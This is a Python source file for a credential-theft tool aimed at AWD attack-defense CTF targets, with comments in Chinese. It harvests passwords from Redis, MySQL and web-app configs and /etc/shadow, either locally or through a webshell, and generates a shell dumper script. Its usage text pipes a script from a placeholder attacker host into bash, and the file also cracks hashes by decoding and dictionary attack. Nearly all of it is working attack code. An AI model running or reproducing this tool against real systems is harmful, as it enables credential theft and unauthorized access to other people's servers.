#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AWD 凭据提取与密码逆向工具
==========================
用途: 拿到靶机 RCE/文件读取后, 提取所有含密码的原始配置文件(原码),
      自动识别密码的编码/加密形式, 递归逆向解码还原明文密码.

场景:
  - 对手加固了 Redis (requirepass), 从 /etc/redis/redis.conf 提取 requirepass 值,
    若是 base64/hex/双重编码, 自动解出明文用于连接 Redis 改分
  - 从 PHP 业务代码 (wp-config.php / .env / config.php) 提取 DB_PASSWORD,
    识别 md5/base64 后还原, 用于连数据库拿 flag
  - 识别 PHP 后门里 eval(gzinflate(base64_decode(...))) 的嵌套编码

三种用法:
  1) 本地提取 (直接在靶机跑, 或已 SSH 登录):
       python3 credential_extractor.py --local
  2) 远程提取 (通过 Webshell):
       python3 credential_extractor.py --webshell http://target/shell.php --pwd awd2024
  3) 生成靶机端 dumper (靶机没 python 时, 生成一段 shell 在靶机执行):
       python3 credential_extractor.py --gen-dumper > /tmp/dump.sh
     然后: curl http://attacker/dump.sh | bash  (或贴到 webshell 执行)
     再:   python3 credential_extractor.py --crack dump.txt

  纯逆向 (已有密码字符串, 只想识别+解码):
       python3 credential_extractor.py --crack 'base64字符串'
       python3 credential_extractor.py --crack dump.txt
"""

import os
import re
import sys
import base64
import binascii
import urllib.parse
import codecs
import zlib
import hashlib
import string
import json
import argparse

# 颜色
R = '\033[0;31m'; G = '\033[0;32m'; Y = '\033[1;33m'
C = '\033[0;36m'; B = '\033[1m'; N = '\033[0m'


def banner():
    print(f"""{B}
╔═══════════════════════════════════════════════════════════════════════════╗
║  🔑 AWD 凭据提取 & 密码逆向工具                                           ║
║  提取原码 → 识别编码形式 → 递归逆向解码 → 还原明文密码                      ║
╚═══════════════════════════════════════════════════════════════════════════╝{N}""")


# ================================================================
# Part 1: 原码提取目标清单
# ================================================================
# 每项: (标签, 路径列表, grep 关键词正则, 提取模式)
#   提取模式: 'full' = 整个文件; 'grep' = 只取含关键词的行; 'find' = 动态查找
EXTRACT_TARGETS = [
    # --- Redis ---
    ('Redis配置', [
        '/etc/redis/redis.conf', '/etc/redis.conf',
        '/usr/local/etc/redis.conf', '/etc/redis/redis-sentinel.conf',
        '/root/.redis/redis.conf', '~/.redis/redis.conf',
    ], r'requirepass|^\s*port\s|^\s*bind\s|^\s*rename-command', 'grep'),
    ('Redis启动命令', [], r'redis-server', 'find'),  # 从 ps 里捞

    # --- MySQL / MariaDB ---
    ('MySQL配置', [
        '/root/.my.cnf', '/etc/mysql/debian.cnf', '/etc/my.cnf',
        '/etc/mysql/my.cnf', '/etc/mysql/conf.d/*.cnf',
        '~/.my.cnf', '/var/lib/mysql/.my.cnf',
    ], r'password|passwd|user\s*=', 'grep'),

    # --- PHP Web 应用 ---
    ('WordPress', [
        '/var/www/html/wp-config.php', '/app/wp-config.php',
        '/var/www/wp-config.php', '/srv/www/wp-config.php',
    ], r'DB_PASSWORD|DB_USER|DB_HOST|AUTH_KEY|DB_NAME', 'grep'),
    ('Laravel/通用.env', [
        '/var/www/html/.env', '/app/.env', '/srv/.env',
        '/var/www/.env', '/opt/app/.env',
    ], r'PASS|SECRET|KEY|TOKEN|DB_|REDIS_|APP_', 'grep'),
    ('通用PHP配置', [
        '/var/www/html/config.php', '/var/www/html/config/config.php',
        '/var/www/html/include/config.php', '/var/www/html/inc/config.php',
        '/var/www/html/application/config/database.php',
        '/var/www/html/configuration.php', '/app/config/database.php',
        '/var/www/html/common/config.php', '/var/www/html/conn.php',
        '/var/www/html/db.php', '/var/www/html/database.php',
    ], r'password|passwd|pass\s*=|pwd|secret|auth|redis|mysql|DB_', 'grep'),

    # --- 其他服务 ---
    ('SSH配置', ['/etc/ssh/sshd_config'], r'PermitRootLogin|PasswordAuth|Port\s', 'grep'),
    ('系统用户哈希', ['/etc/shadow'], r'.+', 'grep'),

    # --- 动态查找 (find) ---
    ('动态查找含密码文件', [], r'password|passwd|requirepass|secret|auth', 'find'),
]

# find 查找命令模板
FIND_CMD = (
    r"find /var/www /app /opt /home /srv /root /etc "
    r"-type f \( -name '*.php' -o -name '*.env' -o -name '*.yml' "
    r"-o -name '*.yaml' -o -name '*.conf' -o -name '*.ini' -o -name '*.json' "
    r"-o -name '*.cnf' -o -name '*.sh' -o -name '*.py' \) "
    r"-readable 2>/dev/null "
    r"| xargs -r grep -l -iE 'password|passwd|requirepass|secret|auth|DB_PASS' 2>/dev/null "
    r"| head -30"
)

# ps 提取 redis-server 启动参数 (可能带 --requirepass)
PS_CMD = "ps aux 2>/dev/null | grep -E 'redis-server|mysqld' | grep -v grep"


# ================================================================
# Part 2: 原码提取器
# ================================================================
class Extractor:
    def __init__(self, local=True, webshell_url=None, webshell_pwd='awd2024'):
        self.local = local
        self.webshell_url = webshell_url
        self.webshell_pwd = webshell_pwd
        self.results = []  # [(标签, 路径, 内容)]

    def _exec(self, cmd):
        """执行命令: 本地直接 os.popen, 远程通过 webshell"""
        if self.local:
            try:
                with os.popen(cmd + ' 2>/dev/null') as f:
                    return f.read()
            except Exception as e:
                return f'[err] {e}'
        else:
            return self._exec_webshell(cmd)

    def _exec_webshell(self, cmd):
        """通过 webshell 执行命令 (POST cmd=xxx&pwd=xxx)"""
        import requests
        try:
            r = requests.post(
                self.webshell_url,
                data={'cmd': cmd, 'pwd': self.webshell_pwd},
                timeout=15
            )
            return r.text
        except Exception as e:
            return f'[webshell err] {e}'

    def extract_all(self):
        """提取所有目标"""
        print(f"\n{C}[*] 开始提取原码 (模式: {'本地' if self.local else 'Webshell ' + self.webshell_url}){N}")
        for label, paths, pattern, mode in EXTRACT_TARGETS:
            print(f"\n{B}[{label}]{N}")
            if mode == 'find' and not paths:
                # 动态查找
                if label == 'Redis启动命令':
                    out = self._exec(PS_CMD)
                    if out.strip() and 'redis-server' in out:
                        print(f"  {G}找到进程:{N}")
                        for line in out.strip().split('\n'):
                            if 'redis-server' in line or 'mysqld' in line:
                                print(f"    {line.strip()}")
                                if '--requirepass' in line:
                                    m = re.search(r'--requirepass\s+(\S+)', line)
                                    if m:
                                        self._record(label, 'ps:redis-server',
                                                     f'--requirepass {m.group(1)}',
                                                     m.group(1))
                else:
                    # find 查找含密码的文件
                    out = self._exec(FIND_CMD)
                    files = [l.strip() for l in out.split('\n') if l.strip()]
                    if files:
                        print(f"  {G}找到 {len(files)} 个可疑文件:{N}")
                        for f in files[:15]:
                            content = self._exec(f'cat "{f}" 2>/dev/null | grep -iE "{pattern}" | head -20')
                            if content.strip():
                                print(f"    {C}{f}{N}")
                                self._print_content(content, f)
                                self._record(label, f, content, _extract_pwd_from_text(content))
                    else:
                        print(f"  {Y}(无){N}")
                continue

            # 静态路径
            found_any = False
            for p in paths:
                p = os.path.expanduser(p)
                if '*' in p:
                    # 通配符 (如 /etc/mysql/conf.d/*.cnf)
                    import glob
                    matches = glob.glob(p)
                else:
                    matches = [p] if self._exists(p) else []

                for real_path in matches:
                    if mode == 'full':
                        content = self._exec(f'cat "{real_path}"')
                    else:
                        content = self._exec(
                            f'cat "{real_path}" 2>/dev/null | grep -iE "{pattern}" | head -30'
                        )
                    if content and content.strip() and '[err]' not in content[:20]:
                        found_any = True
                        print(f"  {C}{real_path}{N}")
                        self._print_content(content, real_path)
                        self._record(label, real_path, content, _extract_pwd_from_text(content))
            if not found_any:
                print(f"  {Y}(未找到){N}")

        return self.results

    def _exists(self, p):
        if self.local:
            return os.path.exists(p)
        else:
            out = self._exec(f'test -f "{p}" && echo EXISTS')
            return 'EXISTS' in out

    def _print_content(self, content, path):
        """打印原码内容 (截断)"""
        lines = content.strip().split('\n')
        for ln in lines[:20]:
            # 高亮密码关键词
            ln_h = re.sub(
                r'(password|passwd|requirepass|pass|pwd|secret|auth|key|token|DB_PASS)',
                f'{Y}\\1{N}', ln, flags=re.IGNORECASE
            )
            print(f"    {ln_h}")
        if len(lines) > 20:
            print(f"    {Y}... ({len(lines) - 20} 行省略){N}")

    def _record(self, label, path, content, pwd_candidates):
        self.results.append((label, path, content, pwd_candidates or []))

    def summary(self):
        """汇总所有提取到的密码候选"""
        print(f"\n{B}{'=' * 70}{N}")
        print(f"{B}📋 提取汇总{N}")
        print(f"{'=' * 70}")
        all_pwd = []
        for label, path, content, pwds in self.results:
            for p in pwds:
                all_pwd.append((label, path, p))
                print(f"  {G}[{label}]{N} {C}{path}{N}")
                print(f"     密码候选: {B}{p}{N}")
        if not all_pwd:
            print(f"  {Y}(未提取到密码候选, 可检查原码手动识别){N}")
        return all_pwd


def _extract_pwd_from_text(text):
    """从文本里提取密码候选字符串"""
    candidates = []
    # requirepass xxx
    for m in re.finditer(r'requirepass\s+(\S+)', text):
        candidates.append(m.group(1).strip('"\''))
    # DB_PASSWORD', 'xxx'  /  DB_PASSWORD = "xxx"
    for m in re.finditer(r"DB_PASSWORD['\"\s]*[,:=]\s*['\"]([^'\"]+)['\"]", text, re.IGNORECASE):
        candidates.append(m.group(1))
    # password = 'xxx' / password => 'xxx' / "password":"xxx"
    for m in re.finditer(r"(?:password|passwd|pass|pwd|secret|auth_pass)['\"\s]*[,:==>\s]+\s*['\"]([^'\"]{3,})['\"]", text, re.IGNORECASE):
        candidates.append(m.group(1))
    # --requirepass xxx (启动参数)
    for m in re.finditer(r'--requirepass\s+(\S+)', text):
        candidates.append(m.group(1).strip('"\''))
    # .env: REDIS_PASSWORD=xxx / DB_PASSWORD=xxx (无引号, 值不含空格/引号)
    for m in re.finditer(r'(?:PASS|SECRET|KEY|TOKEN|DB_PASS|REDIS_PASS)[A-Z_]*\s*=\s*(\S+)', text):
        v = m.group(1).strip('"\'')
        if v and not v.startswith('$') and not v.startswith('('):
            candidates.append(v)
    # /etc/shadow 哈希字段: 用户名:$算法$盐$哈希  或  用户名:*  用户名:!
    for m in re.finditer(r'^(\S+):(\$[0-9]\$.+|\$y\$.+|\$2[aby]\$.+)', text, re.MULTILINE):
        candidates.append(m.group(2))
    # 去重保序 + 严格过滤
    seen = set()
    out = []
    for c in candidates:
        c = c.strip('"\'').strip()
        if not c or c in seen:
            continue
        # 排除明显非密码: 含空格/路径/以 ; - 开头/是已知命令或路径
        if ' ' in c or '\t' in c:
            continue
        if c.startswith(';') or c.startswith('-') or c.startswith('/'):
            continue
        # 排除纯文件名/路径特征
        if c in ('root', 'nobody', 'daemon', 'www-data', 'redis', 'mysql', 'YES', 'NO',
                 'yes', 'no', 'true', 'false', 'NULL', 'null'):
            continue
        if len(c) < 2 or len(c) > 200:
            continue
        seen.add(c)
        out.append(c)
    return out


# ================================================================
# Part 3: 密码编码形式识别 + 递归逆向解码
# ================================================================
class PasswordCracker:
    def __init__(self, max_depth=6, dict_cracker=None):
        self.max_depth = max_depth
        self.dict_cracker = dict_cracker  # DictCracker 实例, 用于哈希爆破

    # --- 单步解码: 尝试各种编码, 返回 (解码结果, 形式名) ---
    # 注意: rot13 因对称性 (rot13(rot13(x))=x) 会导致死循环, 不参与递归,
    #       由 analyze() 顶层单独尝试一次, 且仅当结果含可读字母词时才报告.
    def _try_single_decode(self, s):
        """对字符串 s 尝试所有已知解码, 返回 [(结果, 形式), ...]"""
        results = []
        seen_res = set()

        def _add(txt, form):
            if txt and txt != s and txt not in seen_res:
                seen_res.add(txt)
                results.append((txt, form))

        # 1. base64 标准编码
        if re.fullmatch(r'[A-Za-z0-9+/]+=*', s) and len(s) >= 4 and len(s) % 4 == 0:
            try:
                dec = base64.b64decode(s, validate=True)
                if self._is_printable(dec):
                    _add(dec.decode('utf-8', 'replace'), 'base64')
            except (binascii.Error, ValueError):
                pass

        # 2. base64 URL safe (仅当含 -_ 时才试, 避免与 base64 重复)
        if re.search(r'[-_]', s) and re.fullmatch(r'[A-Za-z0-9\-_]+=*', s) and len(s) >= 4:
            try:
                pad = '=' * (-len(s) % 4)
                dec = base64.urlsafe_b64decode(s + pad)
                if self._is_printable(dec):
                    _add(dec.decode('utf-8', 'replace'), 'base64url')
            except (binascii.Error, ValueError):
                pass

        # 3. hex 编码
        if re.fullmatch(r'[0-9a-fA-F]+', s) and len(s) >= 2 and len(s) % 2 == 0:
            try:
                dec = binascii.unhexlify(s)
                if self._is_printable(dec):
                    _add(dec.decode('utf-8', 'replace'), 'hex')
            except (binascii.Error, ValueError):
                pass

        # 4. URL 编码 (%XX)
        if '%' in s and re.search(r'%[0-9a-fA-F]{2}', s):
            try:
                dec = urllib.parse.unquote(s)
                if dec != s:
                    _add(dec, 'url编码')
            except Exception:
                pass

        # 5. base32
        if re.fullmatch(r'[A-Z2-7]+=*', s) and len(s) >= 8:
            try:
                dec = base64.b32decode(s)
                if self._is_printable(dec):
                    _add(dec.decode('utf-8', 'replace'), 'base32')
            except (binascii.Error, ValueError):
                pass

        # 6. gzinflate(base64) / gzip(base64) (PHP 常见)
        if re.fullmatch(r'[A-Za-z0-9+/]+=*', s) and len(s) >= 8 and len(s) % 4 == 0:
            try:
                raw = base64.b64decode(s, validate=True)
                try:
                    dec = zlib.decompress(raw, -15)
                    if self._is_printable(dec):
                        _add(dec.decode('utf-8', 'replace'), 'gzinflate(base64)')
                except zlib.error:
                    pass
                try:
                    dec2 = zlib.decompress(raw)
                    if self._is_printable(dec2):
                        _add(dec2.decode('utf-8', 'replace'), 'gzip(base64)')
                except zlib.error:
                    pass
            except (binascii.Error, ValueError):
                pass

        # 7. JSON 包装 {"password":"xxx"}
        if s.startswith('{') and s.endswith('}'):
            try:
                j = json.loads(s)
                if isinstance(j, dict):
                    for k in ('password', 'pass', 'pwd', 'secret', 'key', 'auth'):
                        if k in j:
                            _add(str(j[k]), f'json[{k}]')
            except (json.JSONDecodeError, ValueError):
                pass

        return results

    def _is_printable(self, b):
        """字节串是否可打印 (允许少量控制字符)"""
        if not b:
            return False
        printable = sum(1 for x in b if 32 <= x < 127 or x in (9, 10, 13))
        return printable / len(b) > 0.85

    def _has_letter(self, s):
        return any(c.isalpha() for c in s)

    # --- 识别哈希 ---
    def _identify_hash(self, s):
        """识别常见哈希形式"""
        s = s.strip().lower()
        if re.fullmatch(r'[0-9a-f]{32}', s):
            return 'MD5 (32位hex) → 建议查询 cmd5.com / somd5.com / cmd5.cn'
        if re.fullmatch(r'[0-9a-f]{40}', s):
            return 'SHA1 (40位hex) → 建议查询 hashkiller.com'
        if re.fullmatch(r'[0-9a-f]{64}', s):
            return 'SHA256 (64位hex) → 建议查询 crackstation.net'
        # MySQL 5.x: *XXXXXXXXXX (41位, *开头)
        if re.fullmatch(r'\*[0-9A-F]{40}', s.upper()):
            return 'MySQL5.x PASSWORD() 哈希 (*开头40位hex) → 用 hashcat -m 300'
        # NTLM
        if re.fullmatch(r'[0-9a-f]{32}', s) and ':' in s:
            return 'NTLM hash → hashcat -m 1000'
        # bcrypt
        if s.startswith('$2a$') or s.startswith('$2b$') or s.startswith('$2y$'):
            return 'bcrypt hash → hashcat -m 3200 / john'
        # /etc/shadow 常见 crypt 哈希
        if s.startswith('$y$'):
            return 'yescrypt hash (/etc/shadow) → john --format=yescrypt'
        if s.startswith('$6$'):
            return 'SHA-512 crypt (/etc/shadow) → hashcat -m 1800 / john'
        if s.startswith('$5$'):
            return 'SHA-256 crypt (/etc/shadow) → hashcat -m 7400 / john'
        if s.startswith('$1$'):
            return 'MD5 crypt (/etc/shadow) → hashcat -m 500 / john'
        return None

    # --- 递归解码 ---
    def decode_recursive(self, s, depth=0, path=None, visited=None):
        """
        递归解码: 对 s 尝试解码, 若结果还能再解则继续, 直到不可解或达到 max_depth.
        返回所有解码路径 [(解码链描述, 最终结果), ...]
        visited: 已处理的字符串集合, 防止循环
        """
        if path is None:
            path = []
        if visited is None:
            visited = set()
        s = s.strip().strip('"\'')
        results = []

        # 防循环: 同一字符串不重复处理
        if s in visited:
            return results
        visited.add(s)

        # 到达深度上限
        if depth >= self.max_depth:
            return results

        # 尝试单步解码
        candidates = self._try_single_decode(s)
        for decoded, form in candidates:
            if decoded == s:
                continue  # 没变化
            chain = path + [f'{form}→"{decoded}"']
            # 如果解码结果像明文 (含可读字符, 不再是编码串), 记录
            if self._looks_plaintext(decoded):
                results.append((' → '.join(chain), decoded))
            # 继续递归
            sub = self.decode_recursive(decoded, depth + 1, chain, visited)
            results.extend(sub)

        return results

    def _looks_plaintext(self, s):
        """判断是否像最终明文 (有可读含义, 不再是编码串)"""
        if not s:
            return False
        # 含空格或常见密码字符组合
        has_space = ' ' in s
        # 长度合理, 字符多样
        variety = len(set(s))
        # 全是 hex 且长度 32+ 可能还是哈希
        if re.fullmatch(r'[0-9a-f]+', s.lower()) and len(s) >= 32:
            return False
        # 全是 base64 字符且长度合理, 可能还能解
        if re.fullmatch(r'[A-Za-z0-9+/]+={0,2}', s) and len(s) >= 8 and len(s) % 4 == 0:
            # 再尝试解一次, 能解就说明不是终点
            try:
                dec = base64.b64decode(s, validate=True)
                if self._is_printable(dec) and dec.decode('utf-8', 'replace') != s:
                    return False
            except Exception:
                pass
        # 有可读含义 (字母+数字+符号混合, 或含字典词)
        letters = sum(1 for c in s if c.isalpha())
        digits = sum(1 for c in s if c.isdigit())
        if letters >= 2 and variety >= 3:
            return True
        return has_space

    # --- rot13 顶层单次尝试 (不参与递归, 避免对称死循环) ---
    def _try_rot13_top(self, s):
        """对原始字符串尝试 rot13.
        仅当原串是纯字母 (rot13 只编码字母, 含数字/符号的串 rot13 通常无意义,
        如 base64 串做 rot13 只会产生乱码) 且结果是可读字母词时返回."""
        if not re.fullmatch(r'[A-Za-z]{4,}', s):
            return None
        try:
            dec = codecs.encode(s, 'rot_13')
            if dec != s and self._is_readable_word(dec):
                return dec
        except Exception:
            pass
        return None

    def _is_readable_word(self, s):
        """判断是否像可读词 (含元音的字母序列, 像英文/拼音)"""
        if not s:
            return False
        letters = [c for c in s if c.isalpha()]
        if len(letters) < 3:
            return False
        vowels = sum(1 for c in s.lower() if c in 'aeiou')
        # 含至少1个元音, 且字母占比高
        return vowels >= 1 and len(letters) / max(len(s), 1) > 0.5

    # --- 对单个密码字符串做完整分析 ---
    def analyze(self, s):
        """分析单个密码字符串: 识别形式 + 尝试解码"""
        print(f"\n{B}🔍 分析密码字符串:{N} {C}{s}{N}")
        print(f"   长度: {len(s)}  字符集: {self._charset(s)}")

        # 1. 哈希识别
        h = self._identify_hash(s)
        if h:
            print(f"   {Y}[形式] {h}{N}")

        # 2. 递归解码
        paths = self.decode_recursive(s)

        # 3. rot13 顶层单次尝试 (不递归, 避免对称循环)
        rot13_dec = self._try_rot13_top(s)
        if rot13_dec:
            paths.append((f'rot13→"{rot13_dec}"', rot13_dec))
            # 如果 rot13 结果还能 base64/hex 解, 也尝试一层 (不递归)
            sub_cands = self._try_single_decode(rot13_dec)
            for dec, form in sub_cands:
                if self._looks_plaintext(dec):
                    paths.append((f'rot13→"{rot13_dec}" → {form}→"{dec}"', dec))

        if not paths:
            # 已识别为哈希 → 尝试字典爆破
            if h:
                # 判断是纯 hex 哈希还是 crypt 哈希
                is_crypt = s.strip().startswith('$')
                if self.dict_cracker and not is_crypt:
                    print(f"   {C}🔑 尝试用字典爆破哈希...{N}")
                    result = self.dict_cracker.crack_hash(s, 'auto')
                    if result:
                        print(f"   {G}✅ 爆破成功! 明文 = {B}{result}{N}")
                        return [(s, f'{h.split(" ")[0]} → 字典爆破', result)]
                    else:
                        print(f"   {Y}❌ 字典未命中, 建议查 hash 库 (cmd5.com/somd5.com){N}")
                elif self.dict_cracker and is_crypt:
                    print(f"   {C}🔑 尝试用字典爆破 crypt 哈希...{N}")
                    result = self.dict_cracker.crack_crypt(s)
                    if result:
                        print(f"   {G}✅ 爆破成功! 明文 = {B}{result}{N}")
                        return [(s, f'{h.split(" ")[0]} → 字典爆破', result)]
                    else:
                        print(f"   {Y}❌ 字典未命中, 建议用 john/hashcat 暴力破解{N}")
                else:
                    print(f"   {Y}→ 这是哈希, 无法逆向解码, 需用彩虹表/暴力破解{N}")
                    print(f"   {Y}  提示: 加 --dict 参数可用内置字典爆破{N}")
                return [(s, '哈希', s)]
            # 检查是否本身就是明文
            if self._looks_plaintext(s) or len(s) < 32:
                print(f"   {G}[形式] 明文 (无可识别编码, 或已是最简形式){N}")
                print(f"   {G}[明文] {s}{N}")
            else:
                print(f"   {Y}[形式] 未能自动识别 (可能是自定义加密/盐值哈希){N}")
                print(f"   {Y}       建议: 1) 查 hash 库  2) 看源码找加密算法  3) 暴力破解{N}")
            return [(s, '明文/未知', s)]

        # 去重 (按最终结果去重, 保留最短链)
        by_result = {}
        for chain, result in paths:
            if result not in by_result or chain.count('→') < by_result[result][0].count('→'):
                by_result[result] = (chain, result)
        uniq = list(by_result.values())
        # 按解码链长度排序 (短的优先)
        uniq.sort(key=lambda x: x[0].count('→'))

        print(f"   {G}找到 {len(uniq)} 个候选明文:{N}")
        for i, (chain, result) in enumerate(uniq, 1):
            print(f"   {G}[{i}]{N} {chain}")
            print(f"        {B}→ {result}{N}")

        # 最可能的明文: 解码链最短 + 结果最像密码 (字母+数字+符号混合, 或含可读词)
        def _score(item):
            chain, result = item
            chain_len = chain.count('→')
            # 像密码的特征: 字母+数字+符号混合, 字符多样
            # 注意: base64 填充符 = 不算密码符号, 排除
            real_syms = [c for c in result if not c.isalnum() and c != '=']
            variety = len(set(result))
            has_letter = any(c.isalpha() for c in result)
            has_digit = any(c.isdigit() for c in result)
            has_sym = len(real_syms) > 0
            # 符号权重最高 (密码强特征), 其次字母+数字混合, 最后字符多样
            pwd_score = (6 if has_sym else 0) + (3 if (has_letter and has_digit) else 0) \
                + (2 if has_letter else 0) + variety // 2
            # 越短链 + 越像密码 = 越好 (分数越高越优先, 取负)
            return (chain_len, -pwd_score, -len(result))

        best = min(uniq, key=_score)
        print(f"   {G}[最可能明文] {B}{best[1]}{N}")
        return [(s, chain, result) for chain, result in uniq]

    def _charset(self, s):
        cs = set()
        for c in s:
            if c.islower():
                cs.add('a-z')
            elif c.isupper():
                cs.add('A-Z')
            elif c.isdigit():
                cs.add('0-9')
            elif c in '+/=':
                cs.add('b64')
            elif c == '%':
                cs.add('%url')
            elif c in '-_':
                cs.add('b64url')
            elif c.isalpha():
                cs.add('letter')
            else:
                cs.add('sym')
        return '/'.join(sorted(cs))


# ================================================================
# Part 4: 靶机端 dumper 生成
# ================================================================
DUMPER_SH = r"""#!/bin/bash
# AWD 凭据原码 dumper - 在靶机执行, 输出所有含密码的配置原码
# 用法: bash dump.sh > creds.txt 2>/dev/null
echo "===== AWD CREDENTIAL DUMP ====="
echo "[*] time: $(date '+%F %T')"
echo "[*] host: $(hostname)  user: $(whoami)"

dump_file() {
    local label="$1" path="$2" pat="$3"
    if [ -r "$path" ]; then
        echo ""
        echo "########## [$label] $path ##########"
        grep -iE "$pat" "$path" 2>/dev/null | head -40
        echo "########## END $path ##########"
    fi
}

# Redis
for c in /etc/redis/redis.conf /etc/redis.conf /usr/local/etc/redis.conf; do
    dump_file "Redis" "$c" 'requirepass|port|bind|rename-command'
done
echo ""
echo "########## [Redis-PS] 进程启动参数 ##########"
ps aux 2>/dev/null | grep -E 'redis-server' | grep -v grep
echo "########## END Redis-PS ##########"

# MySQL
for c in /root/.my.cnf /etc/mysql/debian.cnf /etc/my.cnf /etc/mysql/my.cnf; do
    dump_file "MySQL" "$c" 'password|passwd|user'
done

# PHP / Web
for c in /var/www/html/wp-config.php /app/wp-config.php \
         /var/www/html/.env /app/.env \
         /var/www/html/config.php /var/www/html/config/config.php \
         /var/www/html/include/config.php /var/www/html/conn.php \
         /var/www/html/database.php /var/www/html/configuration.php \
         /var/www/html/application/config/database.php; do
    dump_file "Web" "$c" 'password|passwd|pass|pwd|secret|auth|DB_|REDIS_'
done

# 动态查找
echo ""
echo "########## [Find] 含密码的文件 ##########"
find /var/www /app /opt /home /srv /etc -type f \
    \( -name '*.php' -o -name '*.env' -o -name '*.yml' -o -name '*.yaml' \
       -o -name '*.conf' -o -name '*.ini' -o -name '*.json' -o -name '*.cnf' \) \
    -readable 2>/dev/null \
    | xargs -r grep -l -iE 'password|passwd|requirepass|secret|DB_PASS' 2>/dev/null \
    | head -20
echo "########## END Find ##########"

# Shadow
dump_file "Shadow" /etc/shadow '.+'

echo ""
echo "===== DUMP END ====="
"""


def gen_dumper():
    """生成靶机端 dumper 脚本"""
    print(DUMPER_SH)


# ================================================================
# Part 5: 从 dump 文件批量提取密码并逆向
# ================================================================
def parse_dump_file(path):
    """解析 dumper 输出的文件, 提取密码候选"""
    with open(path, 'r', errors='replace') as f:
        text = f.read()
    candidates = _extract_pwd_from_text(text)
    # 额外: 解析 ########## [label] path ########## 段, 提取每个文件的内容
    sections = re.split(r'########## \[([^\]]+)\] ([^#]+) ##########', text)
    # sections: ['', label1, path1, content1, label2, path2, content2, ...]
    return candidates, text


# ================================================================
# Part 5b: 密码字典 + 规则变换 + 哈希爆破
# ================================================================
# 默认字典路径 (与本脚本同目录)
DEFAULT_DICT = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'password_dict.txt')

# Leet Speak 映射表 (常见字母→符号替换)
LEET_MAP = {
    'a': ['@', '4'], 'A': ['@', '4'],
    'i': ['1', '!'], 'I': ['1', '!'],
    'o': ['0'], 'O': ['0'],
    'e': ['3'], 'E': ['3'],
    's': ['$', '5'], 'S': ['$', '5'],
    't': ['7'], 'T': ['7'],
    'l': ['1'], 'L': ['1'],
    'g': ['9'], 'G': ['9'],
    'b': ['8'], 'B': ['8'],
}

# 数字/符号后缀 (常见密码尾部追加)
SUFFIXES = ['', '123', '1234', '12345', '123456',
            '!', '!!', '@', '#', '$', '%',
            '2024', '2025', '2026', '2023', '2022',
            '01', '02', '11', '88', '66', '99',
            '!@#', '!@', '@123', '#123', '@2024', '@2025', '@2026',
            '!23', '1', '12', '321']


class DictCracker:
    """密码字典加载 + 规则变换 + 哈希爆破"""

    def __init__(self, dict_path=None, auto_expand=True):
        """
        dict_path: 字典文件路径, None 则用默认 password_dict.txt
        auto_expand: 是否自动做规则变换 (leet/后缀/大小写) 扩展字典
        """
        self.dict_path = dict_path or DEFAULT_DICT
        self.auto_expand = auto_expand
        self.base_words = []      # 原始字典词
        self.expanded = set()     # 扩展后去重集合
        self._loaded = False

    def load(self):
        """加载字典文件"""
        if self._loaded:
            return len(self.expanded)
        if not os.path.isfile(self.dict_path):
            return 0
        with open(self.dict_path, 'r', errors='replace') as f:
            for line in f:
                w = line.strip()
                if w and not w.startswith('#'):
                    self.base_words.append(w)
        # 扩展
        if self.auto_expand:
            self._expand()
        else:
            self.expanded = set(self.base_words)
        self._loaded = True
        return len(self.expanded)

    def _expand(self):
        """对基础词做规则变换, 生成扩展字典"""
        # 先加入原始词
        self.expanded.update(self.base_words)

        for word in self.base_words:
            # 跳过特殊标记
            if word == '(空)':
                self.expanded.add('')
                continue

            # 1. 大小写变体
            variants = {word, word.lower(), word.upper(),
                        word.capitalize(), word.swapcase()}
            # 首字母大写 + 其余小写
            if len(word) > 1:
                variants.add(word[0].upper() + word[1:].lower())
            # 首字母大写 + 其余不变
            variants.add(word[:1].upper() + word[1:])

            # 2. 对每个变体加后缀
            for v in variants:
                for suf in SUFFIXES:
                    self.expanded.add(v + suf)

            # 3. Leet speak 变换 (对原始词)
            leet_variants = self._leet_variants(word)
            for lv in leet_variants:
                self.expanded.add(lv)
                for suf in SUFFIXES:
                    self.expanded.add(lv + suf)

            # 4. 反转
            self.expanded.add(word[::-1])

    def _leet_variants(self, word, max_variants=8):
        """生成 leet speak 变体 (限制数量避免爆炸)"""
        results = [word]
        # 找可替换的字符位置
        positions = [(i, c) for i, c in enumerate(word) if c in LEET_MAP]
        if not positions or len(positions) > 6:
            # 太多可替换位会爆炸, 只做全替换
            full = word
            for c in word:
                if c in LEET_MAP:
                    full = full.replace(c, LEET_MAP[c][0])
            if full != word:
                results.append(full)
            return results

        # 逐位替换 (最多 max_variants 个变体)
        for i, c in positions:
            for rep in LEET_MAP.get(c, []):
                new = word[:i] + rep + word[i + 1:]
                if new not in results:
                    results.append(new)
                    if len(results) >= max_variants:
                        return results
        return results

    def crack_hash(self, hash_str, hash_type='md5'):
        """
        用字典爆破哈希
        hash_type: md5 / sha1 / sha256
        返回: 明文密码, 未命中返回 None
        """
        if not self._loaded:
            self.load()
        if not self.expanded:
            return None

        hash_str = hash_str.strip().lower()
        # 去掉哈希前缀 (如 $6$xxx 的 crypt 格式不在此处理, 只处理纯 hex 哈希)
        if hash_str.startswith('$'):
            return None

        hash_funcs = {
            'md5': hashlib.md5,
            'sha1': hashlib.sha1,
            'sha256': hashlib.sha256,
        }

        # 自动识别哈希类型
        if hash_type == 'auto':
            if len(hash_str) == 32:
                hash_type = 'md5'
            elif len(hash_str) == 40:
                hash_type = 'sha1'
            elif len(hash_str) == 64:
                hash_type = 'sha256'
            else:
                return None

        if hash_type not in hash_funcs:
            return None

        hf = hash_funcs[hash_type]

        # 逐个比对
        total = len(self.expanded)
        checked = 0
        for word in self.expanded:
            checked += 1
            if checked % 50000 == 0:
                print(f"   {Y}已检查 {checked}/{total} ...{N}", file=sys.stderr)
            if hf(word.encode('utf-8')).hexdigest() == hash_str:
                return word
        return None

    def crack_crypt(self, hash_str):
        """爆破 /etc/shadow 的 crypt 哈希 ($6$/$5$/$1$/$y$)"""
        if not self._loaded:
            self.load()
        if not self.expanded:
            return None
        import crypt
        hash_str = hash_str.strip()
        # 提取盐 (前缀 + $盐$ )
        parts = hash_str.split('$')
        if len(parts) < 3:
            return None
        # 构造盐: $id$salt$
        salt = '$' + parts[1] + '$' + parts[2] + '$'
        for word in self.expanded:
            try:
                if crypt.crypt(word, salt) == hash_str:
                    return word
            except Exception:
                continue
        return None

    def save(self, path):
        """保存扩展后的字典到文件"""
        if not self._loaded:
            self.load()
        with open(path, 'w') as f:
            for w in sorted(self.expanded):
                f.write(w + '\n')
